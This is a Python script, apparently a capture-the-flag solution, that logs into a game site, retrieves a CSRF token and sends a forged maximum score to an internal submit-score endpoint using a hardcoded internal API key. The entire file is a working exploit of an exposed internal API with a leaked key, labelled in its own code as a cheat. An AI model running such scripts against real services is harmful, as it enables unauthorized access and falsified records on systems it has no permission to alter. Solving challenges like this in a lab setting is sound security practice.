import requests
import logging
import time
import os

# Configuration
BASE_URL = 'https://play.hypnos2026.fr'
LOGIN_URL = f'{BASE_URL}/api/auth/login'
USER_URL = f'{BASE_URL}/api/auth/user'
SUBMIT_URL = f'{BASE_URL}/api/agario/internal/submit-score'

EMAIL = os.environ.get("EMAIL")
PASSWORD = os.environ.get("PASSWORD")

if not EMAIL or not PASSWORD:
    raise ValueError("EMAIL and PASSWORD environment variables must be set.")
INTERNAL_API_KEY = "hypnos-internal-key-2026"

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("agario_solver")

def get_authenticated_session():
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'accept': 'application/json',
        'origin': BASE_URL,
        'referer': f'{BASE_URL}/login' 
    })

    # 1. Get CSRF Token
    logger.info("Retrieving CSRF token...")
    try:
        r = session.get(f'{BASE_URL}/api/csrf-token', timeout=10)
        csrf_token = None
        if r.ok:
            data = r.json()
            csrf_token = data.get('csrf_token')
        
        if not csrf_token and 'csrf_token' in session.cookies:
            csrf_token = session.cookies['csrf_token']
            
        if csrf_token:
            session.headers.update({'x-csrf-token': csrf_token})
            logger.info("CSRF token obtained.")
        else:
            logger.warning("Could not find CSRF token, login might fail.")
    except Exception as e:
        logger.error(f"Error getting CSRF: {e}")

    # 2. Login
    logger.info(f"Logging in as {EMAIL}...")
    try:
        r = session.post(LOGIN_URL, json={"login": EMAIL, "password": PASSWORD}, timeout=10)
        if r.ok:
            logger.info("Login successful.")
            # Update CSRF if changed
            if 'csrf_token' in session.cookies:
                session.headers.update({'x-csrf-token': session.cookies['csrf_token']})
            return session
        else:
            logger.error(f"Login failed: {r.status_code} - {r.text}")
            return None
    except Exception as e:
        logger.error(f"Login error: {e}")
        return None

def get_username(session):
    logger.info("Fetching user profile to get username...")
    try:
        r = session.get(USER_URL, timeout=10)
        if r.ok:
            data = r.json()
            username = data.get('name')
            logger.info(f"Username found: {username}")
            return username
        else:
            logger.error(f"Failed to get user profile: {r.status_code} - {r.text}")
            return None
    except Exception as e:
        logger.error(f"Error fetching profile: {e}")
        return None

def submit_cheat_score(session, username):
    logger.info("Submitting MAX score via internal API...")
    
    # Logic in backend: score = max_mass // 4
    # Max mass allowed is 100,000. 100000 // 4 = 25,000 points.
    # The challenge likely has a max_score cap (e.g. 5000 or 8000), but we send enough to hit it.
    
    payload = {
        "username": username,
        "max_mass": 40000, # 40000 / 4 = 10000 points. Should cover most caps.
        "time_alive_seconds": 3600, # 1 hour survival
        "cells_eaten": 5000,
        "players_eaten": 100
    }
    
    headers = {
        "x-internal-key": INTERNAL_API_KEY
    }
    
    try:
        r = session.post(SUBMIT_URL, json=payload, headers=headers, timeout=10)
        if r.ok:
            logger.info("Score submitted successfully!")
            logger.info(f"Response: {r.json()}")
        else:
            logger.error(f"Failed to submit score: {r.status_code} - {r.text}")
    except Exception as e:
        logger.error(f"Error submitting score: {e}")

def main():
    session = get_authenticated_session()
    if not session:
        return

    username = get_username(session)
    if not username:
        logger.error("Could not retrieve username, aborting.")
        return

    submit_cheat_score(session, username)

if __name__ == "__main__":
    main()
